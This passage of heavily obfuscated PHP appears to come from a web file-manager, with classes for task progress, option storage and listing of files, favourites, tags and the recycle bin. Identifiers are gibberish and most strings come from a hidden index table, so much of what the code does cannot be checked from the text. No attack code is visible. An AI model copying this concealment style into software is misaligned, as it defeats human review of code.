$­ºû”¿[$§í“ƒ¨Ä[1845]] == $Ë‚¹÷‰Ğ) { $çâÎ°…î = 0; } $this->update($çâÎ°…î); } else { $this->update(); $­ºû”¿[$§í“ƒ¨Ä[1835]] = 0; } Cache::remove($­ºû”¿[$§í“ƒ¨Ä[475]] . $§í“ƒ¨Ä[1848]); self::log($§í“ƒ¨Ä[1851] . $Ë‚¹÷‰Ğ . $§í“ƒ¨Ä[73] . $íÊœªâ . $§í“ƒ¨Ä[262] . $±ç„´Ÿ . $§í“ƒ¨Ä[1852] . $­ºû”¿[$§í“ƒ¨Ä[1832]]); } public function updateFileEnd($ş²¹ÓÀ½, $ ¼ÓìİÒ) { $›ÚÑÖÈ— =& $_SERVER[²Ö÷öõ]; $æ¬Ïêæ =& $this->task; $æ¬Ïêæ[$›ÚÑÖÈ—[1832]] = $ş²¹ÓÀ½; $æ¬Ïêæ[$›ÚÑÖÈ—[1834]] = $ ¼ÓìİÒ; $æ¬Ïêæ[$›ÚÑÖÈ—[1838]] += $ ¼ÓìİÒ; $æ¬Ïêæ[$›ÚÑÖÈ—[1839]] = $æ¬Ïêæ[$›ÚÑÖÈ—[1838]]; $this->update(1); self::log($›ÚÑÖÈ—[1853] . $ş²¹ÓÀ½); } public function sourceModelCopy($ç›¨¦Şæ) { $œÃ‡¬Íš =& $_SERVER[²Ö÷öõ]; $ü–Î¿¡ñ = $ç›¨¦Şæ[0]; $ÎØÀ×èÔ = $ç›¨¦Şæ[1]; $£á´‹• =& $this->task; $this->sourceModelCopyFlag = !0; $§·ªªÕ = 0; switch ($ü–Î¿¡ñ) { case $œÃ‡¬Íš[635]: $§·ªªÕ = 1; break; case $œÃ‡¬Íš[638]: $£á´‹•[$œÃ‡¬Íš[1832]] = $ÎØÀ×èÔ[$œÃ‡¬Íš[32]]; break; case $œÃ‡¬Íš[640]: $§·ªªÕ = intval($ç›¨¦Şæ[$œÃ‡¬Íš[456]] * 0.4); break; case $œÃ‡¬Íš[642]: $§·ªªÕ = intval($ç›¨¦Şæ[$œÃ‡¬Íš[456]] * 0.2); break; case $œÃ‡¬Íš[644]: $§·ªªÕ = intval($ç›¨¦Şæ[$œÃ‡¬Íš[456]] * 0.4); break; } $this->update($§·ªªÕ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ä¼ØÖûĞ, $¨ôíÈ) { $ÏşÎÀÀ¯ =& $_SERVER[²Ö÷öõ]; $this->sourceModelCopyFlag = !0; $î¸û„¤Ä = 1; if (isset($ä¼ØÖûĞ[$ÏşÎÀÀ¯[82]])) { $î¸û„¤Ä = $ä¼ØÖûĞ[$ÏşÎÀÀ¯[82]][$ÏşÎÀÀ¯[80]]; $î¸û„¤Ä = $î¸û„¤Ä + $ä¼ØÖûĞ[$ÏşÎÀÀ¯[82]][$ÏşÎÀÀ¯[81]] + 1; } $this->update($î¸û„¤Ä); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÎÌ“‹öŸ) { $this->sourceRemove($ÎÌ“‹öŸ, !1); } public function curlProgress($Äª¢äıâ, $š‡À¤Î, $İ³ÚÓì¡, $¿şÏùÖˆ, $„îà¡ƒ») { $æØ§˜Äò =& $_SERVER[²Ö÷öõ]; $°İÀŒ¡ô =& $this->task; if ($„îà¡ƒ» > 0) { $°İÀŒ¡ô[$æØ§˜Äò[1151]] = $æØ§˜Äò[1854]; $°İÀŒ¡ô[$æØ§˜Äò[1836]] = $æØ§˜Äò[110]; if ($°İÀŒ¡ô[$æØ§˜Äò[1834]]) { $°İÀŒ¡ô[$æØ§˜Äò[1835]] = $„îà¡ƒ»; } if ($°İÀŒ¡ô[$æØ§˜Äò[1837]]) { $°İÀŒ¡ô[$æØ§˜Äò[1835]] = $„îà¡ƒ» + $°İÀŒ¡ô[$æØ§˜Äò[1837]]; } } else { if ($İ³ÚÓì¡ > 0) { if ($°İÀŒ¡ô[$æØ§˜Äò[1834]] == $š‡À¤Î) { $°İÀŒ¡ô[$æØ§˜Äò[1835]] = $İ³ÚÓì¡; $°İÀŒ¡ô[$æØ§˜Äò[1151]] = $æØ§˜Äò[1855]; $°İÀŒ¡ô[$æØ§˜Äò[1836]] = $æØ§˜Äò[1287]; } } } $this->update(); } public function curlProgressStart($õÑû—›Å) { } public function curlProgressEnd($Ì„³Ìãç) { $¸¬ŠÓ„ò =& $_SERVER[²Ö÷öõ]; $ù»…áÛ§ =& $this->task; $şÑÔµæ = curl_getinfo($Ì„³Ìãç); $ÜÕüÃ¬ì = $şÑÔµæ[$¸¬ŠÓ„ò[1856]]; if ($ÜÕüÃ¬ì == -1) { $ÜÕüÃ¬ì = $şÑÔµæ[$¸¬ŠÓ„ò[1857]]; } if ($ù»…áÛ§[$¸¬ŠÓ„ò[1836]] == $¸¬ŠÓ„ò[110] && $ÜÕüÃ¬ì) { $ù»…áÛ§[$¸¬ŠÓ„ò[1837]] += $ÜÕüÃ¬ì; } $this->update(); } } goto F´øàº¼áË; e¸Âô”Á°ø: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\155\117\160\x74\151\x6f\156"; public $field = array(); public function listData($÷×÷œÏ” = false, $ÁºÙñŠÔ = "\x6d\x6f\144\x69\146\x79\x54\x69\x6d\x65", $à¾éŠ³ = false) { $ı½œ¾â› = Model($this->modelType)->get(!1, $this->optionType, !0); $’øŠÖ Ì = array_values($ı½œ¾â›); if ($’øŠÖ Ì && $’øŠÖ Ì[0] && !is_array($’øŠÖ Ì[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ı½œ¾â› = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ı½œ¾â›) { return $÷×÷œÏ” ? null : array(); } if (!$÷×÷œÏ”) { $ı½œ¾â› = array_filter(array_values($ı½œ¾â›)); return array_sort_by($ı½œ¾â›, $ÁºÙñŠÔ, $à¾éŠ³); } return $ı½œ¾â›[$_SERVER[²Ö÷öõ][472] . $÷×÷œÏ”]; } public function insert($º‘×€ßå) { $ÆßÚ‹” =& $_SERVER[²Ö÷öõ]; $º‘×€ßå = array_field_key($º‘×€ßå, $this->field); $ÅÚñÖ‰Î = Model($this->modelType)->get($ÆßÚ‹”[473], $this->optionType . $ÆßÚ‹”[474]); $ÅÚñÖ‰Î = $ÅÚñÖ‰Î ? $ÅÚñÖ‰Î : 0; $º‘×€ßå[$ÆßÚ‹”[475]] = ++$ÅÚñÖ‰Î; $º‘×€ßå[$ÆßÚ‹”[231]] = time(); $º‘×€ßå[$ÆßÚ‹”[88]] = time(); Model($this->modelType)->set($ÆßÚ‹”[473], $ÅÚñÖ‰Î, $this->optionType . $ÆßÚ‹”[474]); Model($this->modelType)->set($ÆßÚ‹”[472] . $ÅÚñÖ‰Î, $º‘×€ßå, $this->optionType); return $ÅÚñÖ‰Î; } public function update($æ…›Ì¢¨, $‚êö¤èÌ) { $›şÔƒ¨× =& $_SERVER[²Ö÷öõ]; $‚êö¤èÌ = array_field_key($‚êö¤èÌ, $this->field); $êüÏ…Ÿø = $this->listData($æ…›Ì¢¨); if (!$êüÏ…Ÿø || !$æ…›Ì¢¨) { return !1; } $‚êö¤èÌ = array_merge($êüÏ…Ÿø, $‚êö¤èÌ); $‚êö¤èÌ[$›şÔƒ¨×[88]] = time(); return Model($this->modelType)->set($›şÔƒ¨×[472] . $æ…›Ì¢¨, $‚êö¤èÌ, $this->optionType); } public function remove($Æ›’„ªÁ) { if (!$Æ›’„ªÁ) { return !1; } return Model($this->modelType)->remove($_SERVER[²Ö÷öõ][472] . $Æ›’„ªÁ, $this->optionType); } public function clear() { $³üœµñ¨ =& $_SERVER[²Ö÷öõ]; Model($this->modelType)->remove($³üœµñ¨[473], $this->optionType . $³üœµñ¨[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¢“Ù›é÷, $„ùô€ßÕ) { if (!$„ùô€ßÕ) { return !1; } $Œãéû®¡ = $this->listData(); $Œãéû®¡ = array_to_keyvalue($Œãéû®¡, $¢“Ù›é÷); return isset($Œãéû®¡[$„ùô€ßÕ]) ? $Œãéû®¡[$„ùô€ßÕ] : !1; } public function findByName($¤Ûƒ¿†¸) { return $this->findByKey($_SERVER[²Ö÷öõ][32], $¤Ûƒ¿†¸); } protected function resetData($Ã…ˆ¸¥â) { $ÔèĞíöá =& $_SERVER[²Ö÷öõ]; $Ã…ˆ¸¥â = is_array($Ã…ˆ¸¥â) ? $Ã…ˆ¸¥â : array(); $Á…¢¥ĞÇ = array(); for ($×·¢õ¸ß = 0; $×·¢õ¸ß < count($Ã…ˆ¸¥â); $×·¢õ¸ß++) { $Á…¢¥ĞÇ[$ÔèĞíöá[472] . $Ã…ˆ¸¥â[$×·¢õ¸ß][$ÔèĞíöá[475]]] = $Ã…ˆ¸¥â[$×·¢õ¸ß]; } return Model($this->modelType)->set($Á…¢¥ĞÇ, !1, $this->optionType); } private function getAutoName($Í¥É—¹) { $Í×“€×ƒ = array_to_keyvalue($this->listData(), $_SERVER[²Ö÷öõ][32]); if (!$Í×“€×ƒ || !isset($Í×“€×ƒ[$Í¥É—¹])) { return $Í¥É—¹; } for ($ÄæÓíÌŞ = 1; $ÄæÓíÌŞ < count($Í×“€×ƒ); $ÄæÓíÌŞ++) { $‘õ¥µÎ• = $Í¥É—¹ . "\x28{$ÄæÓíÌŞ}\x29"; if (!isset($Í×“€×ƒ[$‘õ¥µÎ•])) { return $‘õ¥µÎ•; } } return $‘õ¥µÎ•; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($âòƒéÌÃ = false, $“±é§· = '', $ç™ğºŞ = false) { $ÈÁÇÊä =& $_SERVER[²Ö÷öõ]; $¹’âÒ¹À = $this->cacheGet($“±é§·); $×Îš ÔÊ = $this->optionDefault($“±é§·); $×Îš ÔÊ = is_array($×Îš ÔÊ) ? $×Îš ÔÊ : array(); if (is_array($¹’âÒ¹À)) { $¹’âÒ¹À = array_merge($×Îš ÔÊ, $¹’âÒ¹À); return $âòƒéÌÃ ? isset($¹’âÒ¹À[$âòƒéÌÃ]) ? $¹’âÒ¹À[$âòƒéÌÃ] : null : $¹’âÒ¹À; } $İß¸ë— = $this->filterWhere(array($ÈÁÇÊä[33] => $“±é§·)); $¹’âÒ¹À = $this->where($İß¸ë—)->select(); $¹’âÒ¹À = array_to_keyvalue($¹’âÒ¹À, $ÈÁÇÊä[97], $ÈÁÇÊä[450]); foreach ($¹’âÒ¹À as $ŞÃÎ¼–à => $ÃĞ…­ê£) { if ($ç™ğºŞ || in_array($ŞÃÎ¼–à, $this->jsonField)) { $¹’âÒ¹À[$ŞÃÎ¼–à] = json_decode($ÃĞ…­ê£, !0); } } $this->cacheSet($“±é§·, $¹’âÒ¹À); $¹’âÒ¹À = array_merge($×Îš ÔÊ, $¹’âÒ¹À); return $âòƒéÌÃ ? $¹’âÒ¹À[$âòƒéÌÃ] : $¹’âÒ¹À; } public function set($Ò„»ï—æ, $¼‡Ô»ÊÅ = false, $Şôúœó± = '') { $Ÿ÷‘‘Ÿ =& $_SERVER[²Ö÷öõ]; $this->cacheRemove($Şôúœó±); $°ı¢áÉ« = array(); $¿™¹ùˆŞ = is_array($Ò„»ï—æ) ? $Ò„»ï—æ : array($Ò„»ï—æ => $¼‡Ô»ÊÅ); foreach ($¿™¹ùˆŞ as $°ÓÈ¶îÃ => $çáÂç) { if (is_array($çáÂç)) { $çáÂç = json_encode_force($çáÂç); } $this->checkLength($çáÂç, !1, $this->tableName . $Ÿ÷‘‘Ÿ[4] . $Ò„»ï—æ); $çáÂç = self::textEncode($çáÂç); $¿™¹ùˆŞ = array($Ÿ÷‘‘Ÿ[33] => $Şôúœó±, $Ÿ÷‘‘Ÿ[97] => $°ÓÈ¶îÃ, $Ÿ÷‘‘Ÿ[450] => $çáÂç); $°ı¢áÉ«[] = $this->filterWhere($¿™¹ùˆŞ); } if (!$°ı¢áÉ«) { return !0; } $µö´­©÷ = $this->cacheKey($Ÿ÷‘‘Ÿ[476]); CacheLock::lock($µö´­©÷); $šµª¢º = $this->addAll($°ı¢áÉ«, array(), !0); CacheLock::unlock($µö´­©÷); return $šµª¢º; } protected function optionDefault($Äƒİ§Î = '') { return !1; } public function setDeep($ê‘»ø½´, $¶Ñìü¡ = false, $¿ĞÏÔÈÖ = '') { $ò¸§œ•œ = explode($_SERVER[²Ö÷öõ][10], $ê‘»ø½´); $è±’ƒöï = $this->get(); array_set_value($è±’ƒöï, $ê‘»ø½´, $¶Ñìü¡); $this->set($ò¸§œ•œ[0], $è±’ƒöï[$ò¸§œ•œ[0]], $¿ĞÏÔÈÖ); } public function remove($Êˆ‚¿Öß, $á–Ô˜ˆ€ = '') { $éæ™µÛ =& $_SERVER[²Ö÷öõ]; $this->cacheRemove($á–Ô˜ˆ€); $Ş‰çÁÛš = $this->filterWhere(array($éæ™µÛ[97] => $Êˆ‚¿Öß, $éæ™µÛ[33] => $á–Ô˜ˆ€)); if (is_null($Êˆ‚¿Öß)) { unset($Ş‰çÁÛš[$éæ™µÛ[97]]); } return $this->where($Ş‰çÁÛš)->delete(); } public function cacheSet($à¡Â†Î², $±ÎÌìæ = false) { return Cache::set($this->cacheKey($à¡Â†Î²), $±ÎÌìæ); } public function cacheGet($¥éÌœ‹¤) { return Cache::get($this->cacheKey($¥éÌœ‹¤)); } public function cacheRemove($·‘âº‚…) { return Cache::remove($this->cacheKey($·‘âº‚…)); } protected function filterWhere($ÒÁÓØ‘«) { return $ÒÁÓØ‘«; } protected function cacheKey($ô¸äà³ì) { return $ô¸äà³ì; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\x65" => "\x69\x6f\137\163\x6f\x75\x72\x63\145\137\155\145\x74\x61", "\155\x65\x74\x61\106\151\x65\154\x64" => "\163\157\165\162\143\145\111\104"); protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\x54\151\155\x65", "\164\x69\155\x65", "\151\x6e\x73\145\x72\164", "\x66\165\156\143\x74\151\x6f\156"), array("\143\x72\145\141\x74\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74", "\146\x75\156\x63\164\x69\x6f\x6e"), array("\166\151\x65\x77\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\163\x65\162\x74", "\x66\165\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¶‚É¸Ë‘) { return $this->listSource(array($_SERVER[²Ö÷öõ][477] => $¶‚É¸Ë‘)); } public function typeName($‘¨Ãı‘¹) { static $°úÇæºÆ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\162\157\165\160"); return $°úÇæºÆ[$‘¨Ãı‘¹ . $_SERVER[²Ö÷öõ][12]]; } public function sourceListInfo($áÔ“òõ», $áÔƒ°úª = false) { $ß¾õËğò =& $_SERVER[²Ö÷öõ]; $áÔ“òõ» = $áÔ“òõ» ? $áÔ“òõ» : array(); $áÔ“òõ» = array_filter(array_unique($áÔ“òõ»)); if (!$áÔ“òõ») { return array(); } $ğÁÀ­‚À = $this->where(array($ß¾õËğò[193] => array($ß¾õËğò[7], $áÔ“òõ»)))->select(); $this->_listDataApply($ğÁÀ­‚À, $áÔƒ°úª); return array_to_keyvalue($ğÁÀ­‚À, $ß¾õËğò[193]); } public function pathInfoFilter(&$²ÈøÃ¬) { $Íû÷òÈ =& $_SERVER[²Ö÷öõ]; static $øßşÁÛü = false; static $ø¼úÚˆÊ = false; static $Šâ˜‚Ø = false; if (!$øßşÁÛü) { $Ñëë ˆ§ = $Íû÷òÈ[478]; $Ñëë ˆ§ .= $Íû÷òÈ[479]; $Ñëë ˆ§ .= $Íû÷òÈ[480]; $ã¼ï”Æ• = $Íû÷òÈ[481]; $Ó¨­–€ê = explode($Íû÷òÈ[50], $ã¼ï”Æ•); $øßşÁÛü = explode($Íû÷òÈ[50], $Ñëë ˆ§); $ø¼úÚˆÊ = array(); foreach ($øßşÁÛü as $ëéßÃ·³) { if (in_array($ëéßÃ·³, $Ó¨­–€ê)) { continue; } $ø¼úÚˆÊ[] = $ëéßÃ·³; } $Šâ˜‚Ø = explode($Íû÷òÈ[50], $Íû÷òÈ[482]); } foreach ($Šâ˜‚Ø as $œşú†) { if (isset($²ÈøÃ¬[$œşú†])) { $²ÈøÃ¬[$œşú†] = intval($²ÈøÃ¬[$œşú†]); } } $²ÈøÃ¬[$Íû÷òÈ[87]] = $Íû÷òÈ[483] . $²ÈøÃ¬[$Íû÷òÈ[193]] . $Íû÷òÈ[484]; $²ÈøÃ¬[$Íû÷òÈ[33]] = $²ÈøÃ¬[$Íû÷òÈ[485]] == 1 ? $Íû÷òÈ[78] : $Íû÷òÈ[230]; $²ÈøÃ¬[$Íû÷òÈ[190]] = $this->typeName($²ÈøÃ¬[$Íû÷òÈ[190]]); if ($²ÈøÃ¬[$Íû÷òÈ[485]] != 1) { $²ÈøÃ¬[$Íû÷òÈ[169]] = $²ÈøÃ¬[$Íû÷òÈ[486]]; unset($²ÈøÃ¬[$Íû÷òÈ[486]]); } $½²ƒÇ¢Ì = $øßşÁÛü; if (isset($²ÈøÃ¬[$Íû÷òÈ[487]]) && $²ÈøÃ¬[$Íû÷òÈ[487]][$Íû÷òÈ[488]] == -1) { $½²ƒÇ¢Ì = $ø¼úÚˆÊ; } $²ÈøÃ¬ = array_field_key($²ÈøÃ¬, $½²ƒÇ¢Ì); return $²ÈøÃ¬; } public function listUserFav() { $òÚıÓë =& $_SERVER[²Ö÷öõ]; $È£ÆŞ™Š = Model($òÚıÓë[489])->listData(); $ò¸‡äáˆ = array_filter_by_field($È£ÆŞ™Š, $òÚıÓë[33], $òÚıÓë[490]); $ò¸‡äáˆ = array_to_keyvalue($ò¸‡äáˆ, $òÚıÓë[12], $òÚıÓë[87]); if ($ò¸‡äáˆ) { $Ö®ÈÊÍ = $this->listSource(array($òÚıÓë[491] => array($òÚıÓë[492], $ò¸‡äáˆ))); } $Ö®ÈÊÍ = array_to_keyvalue($Ö®ÈÊÍ[$òÚıÓë[445]], $òÚıÓë[193]); foreach ($È£ÆŞ™Š as &$Î«–İåÉ) { $Î«–İåÉ = array($òÚıÓë[493] => $Î«–İåÉ[$òÚıÓë[475]], $òÚıÓë[494] => $Î«–İåÉ[$òÚıÓë[32]], $òÚıÓë[495] => $Î«–İåÉ[$òÚıÓë[87]], $òÚıÓë[496] => $Î«–İåÉ[$òÚıÓë[33]], $òÚıÓë[497] => $Î«–İåÉ[$òÚıÓë[231]], $òÚıÓë[498] => $Î«–İåÉ[$òÚıÓë[88]]); if ($Î«–İåÉ[$òÚıÓë[33]] == $òÚıÓë[490] && $Ö®ÈÊÍ[$Î«–İåÉ[$òÚıÓë[87]]]) { $Î«–İåÉ[$òÚıÓë[90]] = $Ö®ÈÊÍ[$Î«–İåÉ[$òÚıÓë[87]]]; } } unset($Î«–İåÉ); return $È£ÆŞ™Š; } public function listUserTag($Ş¢É‰‰) { $Å’Á«ö =& $_SERVER[²Ö÷öõ]; if ($Ş¢É‰‰ && !is_array($Ş¢É‰‰)) { $Ş¢É‰‰ = array($Ş¢É‰‰); } $å×ıÍÆª = Model($Å’Á«ö[499])->listData(); $¼áîÛˆª = array(); $Ë¿Ñé–¤ = array(); foreach ($å×ıÍÆª as $¢Ú¿ÖŞ) { $÷ñÕ„Í = $¢Ú¿ÖŞ[$Å’Á«ö[87]]; if (!$÷ñÕ„Í) { continue; } if (!isset($Ë¿Ñé–¤[$÷ñÕ„Í])) { $Ë¿Ñé–¤[$÷ñÕ„Í] = array(); } $Ë¿Ñé–¤[$÷ñÕ„Í][] = $¢Ú¿ÖŞ[$Å’Á«ö[500]]; $¼áîÛˆª[$¢Ú¿ÖŞ[$Å’Á«ö[87]]] = $¢Ú¿ÖŞ; } $ñë¿«í‰ = array(); $°Ÿ«®ÌÛ = array(); $¯âíÎã = array(); foreach ($Ë¿Ñé–¤ as $Íª÷¦ôå => $ûĞ˜â§±) { $Ÿë¤Ì = !0; if (!$Ş¢É‰‰) { $ñë¿«í‰[] = $Íª÷¦ôå; continue; } foreach ($Ş¢É‰‰ as $àÜÌ­ìû) { if (!in_array($àÜÌ­ìû, $ûĞ˜â§±)) { $Ÿë¤Ì = !1; break; } } if (!$Ÿë¤Ì) { continue; } if (!is_numeric($Íª÷¦ôå)) { $—µ¶ÚŸ = $¼áîÛˆª[$Íª÷¦ôå]; $ù…í»Û¹ = array($Å’Á«ö[32] => $—µ¶ÚŸ[$Å’Á«ö[32]], $Å’Á«ö[87] => $—µ¶ÚŸ[$Å’Á«ö[87]], $Å’Á«ö[33] => $—µ¶ÚŸ[$Å’Á«ö[33]], $Å’Á«ö[90] => array($Å’Á«ö[501] => 1), $Å’Á«ö[232] => !0); if ($—µ¶ÚŸ[$Å’Á«ö[33]] == $Å’Á«ö[230]) { $¯âíÎã[] = $ù…í»Û¹; } if ($—µ¶ÚŸ[$Å’Á«ö[33]] == $Å’Á«ö[78]) { $°Ÿ«®ÌÛ[] = $ù…í»Û¹; } continue; } $ñë¿«í‰[] = $Íª÷¦ôå; } if ($ñë¿«í‰) { $ÀÆª”•É = $this->listSource(array($Å’Á«ö[491] => array($Å’Á«ö[492], $ñë¿«í‰))); } $ÀÆª”•É = $ÀÆª”•É ? $ÀÆª”•É : array($Å’Á«ö[85] => array(), $Å’Á«ö[86] => array()); $ÀÆª”•É[$Å’Á«ö[85]] = array_merge($ÀÆª”•É[$Å’Á«ö[85]], $°Ÿ«®ÌÛ); $ÀÆª”•É[$Å’Á«ö[86]] = array_merge($ÀÆª”•É[$Å’Á«ö[86]], $¯âíÎã); if (isset($ÀÆª”•É[$Å’Á«ö[442]]) && count($ñë¿«í‰) == $ÀÆª”•É[$Å’Á«ö[442]][$Å’Á«ö[443]]) { return $ÀÆª”•É; } $Î‰äçÌê = array(); $¹¾“ç€Ö = array_to_keyvalue($ÀÆª”•É[$Å’Á«ö[85]], $Å’Á«ö[12], $Å’Á«ö[193]); $”á‰ÓĞ¥ = array_to_keyvalue($ÀÆª”•É[$Å’Á«ö[86]], $Å’Á«ö[12], $Å’Á«ö[193]); $øÚÛÕÇë = array_merge($”á‰ÓĞ¥, $¹¾“ç€Ö); foreach ($ñë¿«í‰ as $÷ñÕ„Í) { if (!in_array($÷ñÕ„Í, $øÚÛÕÇë)) { $Î‰äçÌê[] = $÷ñÕ„Í; } } if ($Î‰äçÌê) { Model($Å’Á«ö[502])->removeBySource($Î‰äçÌê); } return $ÀÆª”•É; } public function listUserRecycle() { $õ–¥ˆÌÒ =& $_SERVER[²Ö÷öõ]; $ç¦Ç°ï¦ = Model($õ–¥ˆÌÒ[503])->listData(); if (!$ç¦Ç°ï¦) { return array(); } $ĞêÜ¦¡ = array($õ–¥ˆÌÒ[491] => array($õ–¥ˆÌÒ[492], $ç¦Ç°ï¦), $õ–¥ˆÌÒ[504] => 1); return $this->listSource($ĞêÜ¦¡); } public function listSource($Ü›Äï¸­, $øá¥Ú‹ğ = 3000, $ì¦¼Ö = false) { $ñöÜ»ÜØ =& $_SERVER[²Ö÷öõ]; if (!isset($Ü›Äï¸­[$ñöÜ»ÜØ[505]])) { $Ü›Äï¸­[$ñöÜ»ÜØ[505]] = 0; } if (isset($Ü›Äï¸­[$ñöÜ»ÜØ[192]]) && $Ü›Äï¸­[$ñöÜ»ÜØ[192]] == $ñöÜ»ÜØ[228]) { $Ü›Äï¸­[$ñöÜ»ÜØ[486]] = array($ñöÜ»ÜØ[407], $ñöÜ»ÜØ[506]); } $¡š…·›ó = $ñöÜ»ÜØ[507]; $ù¸áÌàË = $this->field($¡š…·›ó)->_makeOrder()->where($Ü›Äï¸­)->selectPage($øá¥Ú‹ğ); $this->_listPageCheck($ù¸áÌàË, $¡š…·›ó, $Ü›Äï¸­); $this->_listDataApply($ù¸áÌàË[$ñöÜ»ÜØ[445]], $ì¦¼Ö); $this->_listMake($ù¸áÌàË); return $ù¸áÌàË; } private function _listPageCheck(&$´º‹›¤Ş, $¾ª¿í, $Ğ³ı¶„Ÿ) { $Ãñ¯Ÿ–Ç =& $_SERVER[²Ö÷öõ]; if (!is_array($´º‹›¤Ş[$Ãñ¯Ÿ–Ç[442]])) { return; } $íÓŞğ®‡ = $´º‹›¤Ş[$Ãñ¯Ÿ–Ç[442]]; if ($íÓŞğ®‡[$Ãñ¯Ÿ–Ç[444]] <= 1) { return; } if ($íÓŞğ®‡[$Ãñ¯Ÿ–Ç[443]] >= 100000) { return; } if (Model($Ãñ¯Ÿ–Ç[508])->get($Ãñ¯Ÿ–Ç[509]) != $Ãñ¯Ÿ–Ç[510]) { return; } $¾ª¿í = str_replace(array($Ãñ¯Ÿ–Ç[53], $Ãñ¯Ÿ–Ç[418], $Ãñ¯Ÿ–Ç[262]), $Ãñ¯Ÿ–Ç[12], $¾ª¿í); $¾ª¿í = $Ãñ¯Ÿ–Ç[511] . str_replace($Ãñ¯Ÿ–Ç[50], $Ãñ¯Ÿ–Ç[512], $¾ª¿í) . $Ãñ¯Ÿ–Ç[513]; $ı„˜Ê»Õ = $Ãñ¯Ÿ–Ç[514]; $ı„˜Ê»Õ = $ı„˜Ê»Õ . $Ãñ¯Ÿ–Ç[515]; $¦ã­çÁ¬ = $íÓŞğ®‡[$Ãñ¯Ÿ–Ç[439]] * ($íÓŞğ®‡[$Ãñ¯Ÿ–Ç[429]] - 1) . $Ãñ¯Ÿ–Ç[50] . $íÓŞğ®‡[$Ãñ¯Ÿ–Ç[439]]; $©¢Æ‚¼Ó = $this->_makeOrder(!0); $ºÆ‡§¢× = $Ãñ¯Ÿ–Ç[511] . str_replace($Ãñ¯Ÿ–Ç[50], $Ãñ¯Ÿ–Ç[512], $©¢Æ‚¼Ó[0]); if (strpos($ºÆ‡§¢×, $Ãñ¯Ÿ–Ç[516])) { $ºÆ‡§¢× = str_replace($Ãñ¯Ÿ–Ç[516], $Ãñ¯Ÿ–Ç[517], $ºÆ‡§¢×); } else { $ºÆ‡§¢× .= $Ãñ¯Ÿ–Ç[518] . $©¢Æ‚¼Ó[1]; } $°®Ã®Õ = array(); foreach ($Ğ³ı¶„Ÿ as $•æà¶ñú => $½É«ö×¿) { $°®Ã®Õ[$Ãñ¯Ÿ–Ç[511] . $•æà¶ñú] = $½É«ö×¿; } $this->alias($Ãñ¯Ÿ–Ç[519])->field($¾ª¿í)->limit($¦ã­çÁ¬)->order($ºÆ‡§¢×); $è•×ˆ°ô = $this->join($ı„˜Ê»Õ)->where($°®Ã®Õ)->select(); if ($è•×ˆ°ô) { $´º‹›¤Ş[$Ãñ¯Ÿ–Ç[445]] = $è•×ˆ°ô; } } protected function _makeOrder($Ãó©–¿Á = false) { $“ü‡å³Í =& $_SERVER[²Ö÷öõ]; $ÃöŒäÍÅ = Model($“ü‡å³Í[520])->get($“ü‡å³Í[521]); $´Ò¯·“À = Model($“ü‡å³Í[520])->get($“ü‡å³Í[522]); $‹Û†Ğá = array($“ü‡å³Í[523] => $“ü‡å³Í[524], $“ü‡å³Í[525] => $“ü‡å³Í[526]); $Æû¤İ„ = array($“ü‡å³Í[32] => $“ü‡å³Í[32], $“ü‡å³Í[79] => $“ü‡å³Í[79], $“ü‡å³Í[169] => $“ü‡å³Í[486], $“ü‡å³Í[527] => $“ü‡å³Í[527], $“ü‡å³Í[528] => $“ü‡å³Í[529], $“ü‡å³Í[231] => $“ü‡å³Í[231], $“ü‡å³Í[88] => $“ü‡å³Í[88]); $öøË¶²â = Input::get($“ü‡å³Í[530], $“ü‡å³Í[7], $ÃöŒäÍÅ, array_keys($Æû¤İ„)); $’û»ñ¢î = Input::get($“ü‡å³Í[531], $“ü‡å³Í[7], $´Ò¯·“À, array_keys($‹Û†Ğá)); if (!in_array($öøË¶²â, array_keys($Æû¤İ„))) { $öøË¶²â = $“ü‡å³Í[32]; } if (!in_array($’û»ñ¢î, array_keys($‹Û†Ğá))) { $öøË¶²â = $“ü‡å³Í[523]; } if ($öøË¶²â == $“ü‡å³Í[32]) { } $Æ…ÈèÂ¯ = $“ü‡å³Í[532] . $Æû¤İ„[$öøË¶²â] . $“ü‡å³Í[53] . $‹Û†Ğá[$’û»ñ¢î]; $Æ…ÈèÂ¯ = rtrim(trim($Æ…ÈèÂ¯), $“ü‡å³Í[50]); if ($Ãó©–¿Á) { return array($Æ…ÈèÂ¯, $‹Û†Ğá[$’û»ñ¢î]); } return $this->order($Æ…ÈèÂ¯); } protected function _listDataApplyItem($‘­»—£œ, $£¼–è÷¡ = false) { $åŸèˆ“Ô = array($‘­»—£œ); $this->_listDataApply($åŸèˆ“Ô, $£¼–è÷¡); return $åŸèˆ“Ô[0]; } protected function _listDataApply(&$ÒÊ‹ ¬Ë, $é×Òàî£ = false) { $ùÍœ–· =& $_SERVER[²Ö÷öõ]; if (!$ÒÊ‹ ¬Ë) { $ÒÊ‹ ¬Ë = array(); return; } $ˆßÂÀÍ¶ = array_to_keyvalue($ÒÊ‹ ¬Ë, $ùÍœ–·[12], $ùÍœ–·[193]); $ˆßÂÀÍ¶ = array_unique($ˆßÂÀÍ¶); $this->_listSourceCache($ÒÊ‹ ¬Ë); if (!$é×Òàî£) { $this->_listAppendMeta($ÒÊ‹ ¬Ë, $ˆßÂÀÍ¶); $this->_listAppendFileMeta($ÒÊ‹ ¬Ë, $ˆßÂÀÍ¶); $this->_listAppendChildren($ÒÊ‹ ¬Ë, 